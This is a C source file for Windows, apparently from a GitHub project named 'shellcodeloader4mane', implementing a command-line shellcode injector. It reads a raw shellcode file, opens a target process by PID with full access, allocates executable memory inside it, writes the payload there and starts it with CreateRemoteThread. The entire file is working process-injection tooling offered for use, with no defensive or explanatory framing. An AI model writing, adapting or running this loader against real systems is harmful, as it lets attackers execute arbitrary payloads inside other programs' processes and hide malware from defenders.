#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


int getFileSize(FILE* filePointer)
{
	fseek(filePointer, 0L, SEEK_END);
	int size = ftell(filePointer);
	fseek(filePointer, 0L, SEEK_SET);
	return size;
}

int main(int argc, char const* argv[])
{
	printf("===========================================================================================================\n");
	printf(" #####                               #####                       #                                         \n");
	printf("#     # #    # ###### #      #      #     #  ####  #####  ###### #        ####    ##   #####  ###### ##### \n");
	printf("#       #    # #      #      #      #       #    # #    # #      #       #    #  #  #  #    # #      #    #\n");
	printf(" #####  ###### #####  #      #      #       #    # #    # #####  #       #    # #    # #    # #####  #    #\n");
	printf("      # #    # #      #      #      #       #    # #    # #      #       #    # ###### #    # #      ##### \n");
	printf("#     # #    # #      #      #      #     # #    # #    # #      #       #    # #    # #    # #      #   # \n");
	printf(" #####  #    # ###### ###### ######  #####   ####  #####  ###### #######  ####  #    # #####  ###### #    #\n");
	printf("-----------------------------------------------------------------------------------------------------------\n");
	printf("               ##   https://github.com/manesec/shellcodeloader4mane   x  @manesec   ##\n");
	printf("===========================================================================================================\n\n");

	if (argc == 3)
	{
		FILE* shellcodeFile;
		errno_t err;

		err = fopen_s(&shellcodeFile, argv[2], "rb");
		if (err == 0 && shellcodeFile != NULL)
		{
			int len = getFileSize(shellcodeFile);
			printf("[INFO] Reading Shellcode length: %d\n", len);
			char* shellcode = NULL;
			shellcode = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (shellcode != NULL)
			{

				// 1. read the shellcode from file
				HANDLE processHandle;
				HANDLE remoteThread;
				PVOID remoteBuffer;
				fread(shellcode, len + 1, 1, shellcodeFile);
				fclose(shellcodeFile);
				
				// 2. inject the shellcode into the process
				printf("[INFO] Injecting to PID: %i \n", atoi(argv[1]));
				processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

				if (processHandle == NULL)
				{
					printf("[ERROR] Could not open process handle.");
					return 1;
				}

				// 3. allocate executable-read-write (XRW) memory for payload
				printf("[INFO] Allocating memory for buffer.\n");
				remoteBuffer = VirtualAllocEx(processHandle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
				if (remoteBuffer == NULL)
				{
					printf("[ERROR] Could not allocate memory for buffer.");
					return 1;
				}

				// 4. write payload to allocated memory
				printf("[INFO] Writing shellcode to buffer.\n");	
				WriteProcessMemory(processHandle, remoteBuffer, shellcode, len, NULL);
				remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

				printf("[INFO] Let's execute shellcode ...\n");
				printf("[INFO] NT Return : %lx \n", remoteThread);

				if (remoteThread == NULL)
				{
					printf("[ERROR] Could not create remote thread.");
					return 1;
				}

				CloseHandle(processHandle);

				printf("[INFO] Injected Done.\n");
				VirtualFree(shellcode, 0, MEM_RELEASE);
				return 0;
			}
			else
			{
				printf("[ERROR] Could not allocate memory for buffer.");
				return 1;
			}
		}
		else
		{
			perror("[ERROR] Can't load the shellcode.");
			return 1;
		}

	}
	else
	{
		printf("InjectionFromBinary <PID> <mane.bin>");
		return 1;
	}
}